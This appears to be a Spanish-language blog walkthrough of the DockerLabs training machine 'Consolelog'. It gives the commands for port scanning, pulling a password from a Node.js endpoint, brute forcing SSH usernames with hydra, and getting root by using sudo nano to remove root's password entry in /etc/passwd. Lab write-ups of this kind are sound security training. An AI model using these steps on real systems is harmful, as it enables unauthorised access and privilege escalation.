---
layout: post
title: "Consolelog"
date: 2024-10-07
 12:40:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Consolelog </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Escaneando los puertos y servicios abiertos de la maquina, tenemos 3 servicios disponibles.

`sudo nmap -p- -T5 --min-rate=5000 --open -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/consolelog/nmap.png){:.margin}

**2\.** En el servicio apache por la web tenemos un boton que si pulsamos y vemos por la consola nos muestra un mensaje.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/consolelog/80.png){:.margin}

**3\.** Hacemos la peticion enviando nuestro token al servidor nodejs, nos devuelve una contraseña, o tambien lo podemos encontrar mediante fuzzing en el fichero server.js.

`curl -s -X POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}' ;echo`

`http://172.17.0.2/backend/server.js`

![img](/notas/public/img/dockerlabs/consolelog/tokenpass.png){:.margin}

**4\.** Intentamos la fuerza bruta por ssh con esta contraseña, dimos con el usuario para conectarnos por ssh.

`hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000`

![img](/notas/public/img/dockerlabs/consolelog/hydra.png){:.margin}

**5\.** Procedemos a conectarnos como usuario lovely por el ssh.

`ssh lovely@172.17.0.2 -p 5000`

![img](/notas/public/img/dockerlabs/consolelog/sshlovely.png){:.margin}

**6\.** Revisamos los privilegios sudo del usuario, tenemos un binario con todos los permisos.

`sudo -l`

![img](/notas/public/img/dockerlabs/consolelog/sudol.png){:.margin}

**7\.** Ya que podemos ejecutar el binario nano como root, podemos editar el passwd, le quitamos la x de root que representa su contraseña activa.

`sudo /usr/bin/nano /etc/passwd`

![img](/notas/public/img/dockerlabs/consolelog/nanopasswd.png){:.margin}
![img](/notas/public/img/dockerlabs/consolelog/nanopasswdok.png){:.margin}

**8\.** Una vez realizado los cambios solo nos queda migrar a root sin proporcinar contraseña alguna.

`su root`

![img](/notas/public/img/dockerlabs/consolelog/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>